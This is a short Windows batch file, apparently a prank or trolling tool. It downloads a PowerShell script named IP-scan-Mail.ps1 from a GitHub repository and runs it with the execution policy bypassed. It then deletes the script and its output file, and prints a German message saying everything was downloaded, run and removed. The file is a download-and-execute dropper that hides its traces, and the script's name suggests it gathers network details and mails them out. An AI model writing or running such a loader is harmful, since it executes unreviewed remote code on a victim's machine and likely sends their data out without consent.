@echo off
set "URL=https://raw.githubusercontent.com/MangoTheSherlock/Trolling_BAT/main/IP-scan-Mail.ps1"
set "Destination=%cd%\IP-scan-Mail.ps1"
set "OutputFile=%cd%\output.txt"

powershell -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%Destination%'"

powershell -ExecutionPolicy Bypass -File "%Destination%"

del /f /q "%OutputFile%"
del /f /q "%Destination%"

echo PowerShell-Skript wurde erfolgreich heruntergeladen, ausgefuehrt, und alle Dateien wurden gelöscht!
exit
